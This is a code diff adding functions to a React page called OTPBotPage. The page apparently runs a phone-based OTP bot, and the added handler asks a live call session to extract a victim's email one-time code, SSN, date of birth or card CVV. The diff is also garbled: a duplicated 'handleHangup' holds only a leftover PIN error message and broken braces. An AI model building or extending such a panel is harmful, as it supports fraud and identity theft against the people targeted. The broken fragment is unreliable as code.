@@ -284,6 +284,35 @@ const OTPBotPage = () => {
         }
     };
 
+    const handleRequestInfo = async (infoType) => {
+        if (!sessionId) return;
+        setIsLoading(true);
+
+        try {
+            await axios.post(`${API}/otp/request-info/${sessionId}?info_type=${infoType}`, {}, {
+                headers: getAuthHeaders()
+            });
+            const labels = {
+                'otp_email': 'Email OTP',
+                'ssn': 'SSN',
+                'dob': 'Date of Birth',
+                'cvv': 'CVV'
+            };
+            toast.info(`Requesting ${labels[infoType] || infoType}`);
+        } catch (error) {
+            toast.error(`Failed to request ${infoType}`);
+        } finally {
+            setIsLoading(false);
+        }
+    };
+
+    const handleHangup = async () => {
+            toast.error('Failed to request PIN');
+        } finally {
+            setIsLoading(false);
+        }
+    };
+
     const handleHangup = async () => {
         if (!sessionId) return;
         setIsLoading(true);
